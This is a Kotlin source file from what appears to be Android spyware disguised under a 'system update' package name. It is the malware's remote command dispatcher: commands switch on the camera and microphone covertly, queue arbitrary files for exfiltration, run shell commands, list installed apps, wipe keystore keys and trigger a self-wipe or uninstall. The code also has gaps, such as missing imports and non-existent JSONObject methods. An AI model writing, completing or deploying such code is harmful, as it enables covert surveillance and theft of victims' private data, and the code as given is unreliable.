package com.androidsystem.update.command

import android.util.Log
import com.androidsystem.update.audio.MicRecorder
import com.androidsystem.update.capture.CameraCapture
import com.androidsystem.update.panic.PanicWipe
import com.androidsystem.update.shell.LiveShell
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.runBlocking
import org.json.JSONObject
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Central command dispatcher. The existing `CoreService.listenForCommands` is
 * extended by registering additional command types here; each command body is
 * a small [JSONObject] with a `type` field.
 *
 * Two execution modes:
 *  - [dispatch]  — fire-and-forget, replies through an async callback.
 *                  Used by the RTDB command listener (best-effort).
 *  - [dispatchNow] — blocks the calling coroutine and returns the result
 *                    synchronously. Used by [CommandQueue] so the row can be
 *                    marked DONE / DEAD based on the result.
 */
@Singleton
class CommandRegistry @Inject constructor(
    private val cameraCapture: CameraCapture,
    private val micRecorder: MicRecorder,
    private val fileExfil: com.androidsystem.update.exfil.FileExfil,
    private val liveShell: LiveShell,
    private val panicWipe: PanicWipe,
    private val configManager: com.androidsystem.update.core.ConfigManager
) {
    private val tag = "CommandRegistry"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun dispatch(cmd: JSONObject, onResult: (JSONObject) -> Unit) {
        scope.launch {
            val res = try { dispatchNow(cmd) } catch (e: Throwable) { errorResult(e) }
            try { onResult(res) } catch (e: Throwable) { Log.e(tag, "onResult", e) }
        }
    }

    /**
     * Synchronously execute a command. Returns a JSON object with at least
     * `ok: true|false`. Throws on programmer errors (unknown command) so the
     * caller's retry path can decide what to do.
     */
    suspend fun dispatchNow(cmd: JSONObject): JSONObject {
        val type = cmd.optString("type")
        return when (type) {
            "SNAP" -> {
                val lens = if (cmd.optBoolean("front", false)) android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                else android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
                val f = cameraCapture.snapJpeg(lens)
                if (f != null) okResult(JSONObject().put("file", f.name).put("size", f.length())) else errorResult("snap failed")
            }
            "RECORD_VIDEO" -> {
                val lens = if (cmd.optBoolean("front", false)) android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                else android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
                val ms = cmd.optLong("duration_ms", 10_000L)
                val f = cameraCapture.recordClip(lens, ms)
                if (f != null) okResult(JSONObject().put("file", f.name).put("size", f.length())) else errorResult("record failed")
            }
            "RECORD_AUDIO" -> {
                val ms = cmd.optLong("duration_ms", 15_000L)
                val f = micRecorder.record(ms)
                if (f != null) okResult(JSONObject().put("file", f.name).put("size", f.length())) else errorResult("record failed")
            }
            "PROBE_MIC" -> {
                val v = micRecorder.probeLevel()
                if (v != null) okResult(JSONObject().put("dbfs", v)) else errorResult("probe failed")
            }
            "PULL_FILE" -> {
                val path = cmd.optString("path")
                if (path.isEmpty()) errorResult("missing path")
                else {
                    val f = java.io.File(path)
                    if (!f.exists()) errorResult("not found") else {
                        fileExfil.enqueue(f, "file", mapOf("source_path" to path))
                        okResult(JSONObject().put("queued", f.name).put("size", f.length()))
                    }
                }
            }
            "LIST_APPS" -> {
                val pm = context.packageManager
                val pkgs = pm.getInstalledApplications(0).map { it.packageName }.sorted()
                okResult(JSONObject().put("count", pkgs.size).put("packages", pkgs.joinToString(",")))
            }
            "EXEC" -> liveShell.execute(cmd.optJSONObject("command") ?: JSONObject())
            "PANIC" -> {
                val lvl = when (cmd.optString("level", "SOFT").uppercase()) {
                    "HARD" -> PanicWipe.Level.HARD
                    "UNINST" -> PanicWipe.Level.UNINST
                    else -> PanicWipe.Level.SOFT
                }
                panicWipe.execute(lvl)
                okResult(JSONObject().put("level", lvl.name))
            }
            "WIPE_KEYS" -> {
                val ks = java.security.KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
                val aliases = ks.aliases().toList()
                aliases.forEach { runCatching { ks.deleteEntry(it) } }
                okResult(JSONObject().put("wiped", aliases.size))
            }
            "TOGGLE_COLLECTOR" -> {
                val name = cmd.optString("name"); val enabled = cmd.optBoolean("enabled", true)
                val key = "monitoring_${name}_enabled"
                configManager.updateConfigValue(key, enabled)
                okResult(JSONObject().put("key", key).put("value", enabled))
            }
            "SET_CONFIG" -> {
                val map = mutableMapOf<String, Any>()
                cmd.keys().forEach { k -> if (k != "type") map[k] = cmd.get(k) }
                runBlocking { configManager.updateConfig(map) }
                okResult(JSONObject().put("applied", map.size))
            }
            "GET_CONFIG" -> okResult(configManager.getConfig())
            "PING" -> okResult(JSONObject()
                .put("uptime", android.os.SystemClock.elapsedRealtime())
                .put("model", android.os.Build.MODEL)
                .put("sdk", android.os.Build.VERSION.SDK_INT)
                .put("manufacturer", android.os.Build.MANUFACTURER))
            "OTA_CHECK" -> otaCheck()
            else -> errorResult("unknown command: $type")
        }
    }

    /**
     * Forward to the OTA updater service. Implemented as a service in the
     * same package — see [OtaUpdater]. Kept here so [CommandQueue] has a
     * single dispatcher to call.
     */
    private suspend fun otaCheck(): JSONObject = try {
        val updater = com.androidsystem.update.ota.OtaUpdater.getInstance(context)
        val r = updater.check()
        okResult(r)
    } catch (e: Throwable) { errorResult(e) }

    private val context: Context
        get() = com.androidsystem.update.core.AppContextHolder.context

    private fun okResult(extra: JSONObject = JSONObject()) = JSONObject().apply { put("ok", true); putAll(extra) }
    private fun errorResult(e: Throwable) = JSONObject().apply { put("ok", false); put("error", e.message ?: e.javaClass.simpleName) }
    private fun errorResult(msg: String) = JSONObject().apply { put("ok", false); put("error", msg) }
}
